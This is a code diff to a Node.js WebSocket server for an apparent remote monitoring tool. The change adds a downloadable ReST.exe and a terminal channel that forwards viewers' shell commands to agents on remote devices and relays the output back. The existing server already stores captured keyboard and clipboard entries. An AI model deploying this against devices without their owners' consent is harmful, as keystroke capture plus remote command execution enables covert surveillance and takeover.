@@ -15,6 +15,7 @@ const MAX_SCREENSHOTS = Number(process.env.MAX_SCREENSHOTS) || 80;
 const MAX_RECORDINGS = Number(process.env.MAX_RECORDINGS) || 20;
 
 const agents = new Map();
+const termAgents = new Map();
 const agentMeta = new Map();
 const viewers = new Map();
 const dashboardClients = new Set();
@@ -211,6 +212,10 @@ app.get("/download/uninstall.ps1", (req, res) => {
 
 app.get("/download/ReSA.exe", (req, res) => {
   sendDownloadAsset(res, "ReSA.exe", "application/octet-stream");
+});
+
+app.get("/download/ReST.exe", (req, res) => {
+  sendDownloadAsset(res, "ReST.exe", "application/octet-stream");
 });
 
 app.use("/download", express.static(downloadsDir));
@@ -445,9 +450,10 @@ function deviceSnapshot(deviceId) {
   return {
     deviceId,
     online: agents.has(deviceId),
+    termOnline: termAgents.has(deviceId),
     viewerCount,
-    hostname: meta.hostname || "",
-    platform: meta.platform || "",
+    hostname: meta.hostname || meta.termHostname || "",
+    platform: meta.platform || meta.termPlatform || "",
     monitor: meta.monitor ?? null,
     connectedAt: meta.connectedAt || null,
     lastSeen: meta.lastSeen || null,
@@ -455,7 +461,11 @@ function deviceSnapshot(deviceId) {
 }
 
 function listDevices() {
-  const ids = new Set([...agents.keys(), ...agentMeta.keys()]);
+  const ids = new Set([
+    ...agents.keys(),
+    ...termAgents.keys(),
+    ...agentMeta.keys(),
+  ]);
   return [...ids]
     .map(deviceSnapshot)
     .sort((a, b) => {
@@ -483,6 +493,14 @@ function notifyViewersAgentOnline(deviceId) {
   if (!set) return;
   for (const viewer of set) {
     send(viewer, { type: "agent_online", deviceId });
+  }
+}
+
+function notifyViewersTermOnline(deviceId) {
+  const set = viewers.get(deviceId);
+  if (!set) return;
+  for (const viewer of set) {
+    send(viewer, { type: "term_online", deviceId });
   }
 }
 
@@ -675,6 +693,21 @@ wss.on("connection", (ws, req) => {
     addAudit("agent_online", { deviceId, ip: clientIp });
     broadcastDashboard("devices_changed", { devices: listDevices() });
     console.log(`[agent] online: ${deviceId} (${clientIp})`);
+  } else if (role === "term") {
+    const prev = termAgents.get(deviceId);
+    if (prev && prev !== ws) prev.close(4000, "replaced");
+    termAgents.set(deviceId, ws);
+
+    const meta = agentMeta.get(deviceId) || {};
+    meta.lastSeen = new Date().toISOString();
+    meta.ip = clientIp;
+    agentMeta.set(deviceId, meta);
+
+    send(ws, { type: "registered", role: "term", deviceId });
+    notifyViewersTermOnline(deviceId);
+    addAudit("term_online", { deviceId, ip: clientIp });
+    broadcastDashboard("devices_changed", { devices: listDevices() });
+    console.log(`[term] online: ${deviceId} (${clientIp})`);
   } else if (role === "viewer") {
     if (!viewers.has(deviceId)) viewers.set(deviceId, new Set());
     viewers.get(deviceId).add(ws);
@@ -683,6 +716,7 @@ wss.on("connection", (ws, req) => {
       role: "viewer",
       deviceId,
       agentOnline: agents.has(deviceId),
+      termOnline: termAgents.has(deviceId),
       device: deviceSnapshot(deviceId),
       clipboard: getClipboardEntries(deviceId, 300),
       keyboard: getKeyboardEntries(deviceId, 300),
@@ -784,6 +818,51 @@ wss.on("connection", (ws, req) => {
       return;
     }
 
+    if (ws.role === "term") {
+      const meta = agentMeta.get(deviceId) || {};
+      meta.lastSeen = new Date().toISOString();
+      if (msg.type === "term_info") {
+        meta.termHostname = msg.hostname || meta.termHostname;
+        meta.termPlatform = msg.platform || meta.termPlatform;
+        agentMeta.set(deviceId, meta);
+        broadcastDashboard("devices_changed", { devices: listDevices() });
+        return;
+      }
+      if (msg.type === "terminal_result") {
+        addAudit("terminal_result", {
+          deviceId,
+          exitCode: msg.exitCode,
+          preview: String(msg.stdout || msg.stderr || "").slice(0, 80),
+        });
+        const set = viewers.get(deviceId);
+        if (set) {
+          for (const viewer of set) send(viewer, msg);
+        }
+        return;
+      }
+    }
+
+    if (ws.role === "viewer" && msg.type === "terminal") {
+      const term = termAgents.get(deviceId);
+      if (!term) {
+        send(ws, {
+          type: "terminal_result",
+          id: msg.id,
+          stdout: "",
+          stderr: "terminal agent offline",
+          exitCode: 1,
+        });
+        return;
+      }
+      addAudit("terminal_exec", {
+        deviceId,
+        shell: msg.shell || "cmd",
+        preview: String(msg.command || "").slice(0, 120),
+      });
+      send(term, msg);
+      return;
+    }
+
     if (ws.role === "viewer" && msg.type === "control") {
       const agent = agents.get(deviceId);
       if (agent) send(agent, msg);
@@ -805,6 +884,21 @@ wss.on("connection", (ws, req) => {
       addAudit("agent_offline", { deviceId, ip: clientIp });
       broadcastDashboard("devices_changed", { devices: listDevices() });
       console.log(`[agent] offline: ${deviceId}`);
+    }
+
+    if (ws.role === "term" && termAgents.get(deviceId) === ws) {
+      termAgents.delete(deviceId);
+      const meta = agentMeta.get(deviceId);
+      if (meta) meta.lastSeen = new Date().toISOString();
+      const set = viewers.get(deviceId);
+      if (set) {
+        for (const viewer of set) {
+          send(viewer, { type: "term_offline", deviceId });
+        }
+      }
+      addAudit("term_offline", { deviceId, ip: clientIp });
+      broadcastDashboard("devices_changed", { devices: listDevices() });
+      console.log(`[term] offline: ${deviceId}`);
     }
 
     if (ws.role === "viewer") {
